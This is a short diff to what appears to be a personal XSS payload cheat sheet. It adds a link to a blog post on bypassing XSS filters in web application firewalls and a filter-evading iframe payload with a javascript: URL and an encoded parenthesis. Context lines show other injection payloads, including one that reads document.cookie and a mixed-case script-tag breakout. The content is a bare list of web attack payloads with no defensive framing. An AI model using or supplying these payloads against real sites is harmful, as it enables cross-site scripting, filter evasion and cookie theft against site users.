@@ -1,5 +1,7 @@
 ```
 https://xsshunter.com/app
+
+https://www.volkis.com.au/blog/bypass-xss-in-wafs/
 ```
 
 ```css
@@ -84,6 +86,8 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 ?msg=<h1>Hello World</h1>
 
 '+</ScripT><ScRIpT>prompt(document.domain)</scRIpT>+'
+
+\"><iframe/src=javascript:alert&#x000000028;)>
 
 ```
 
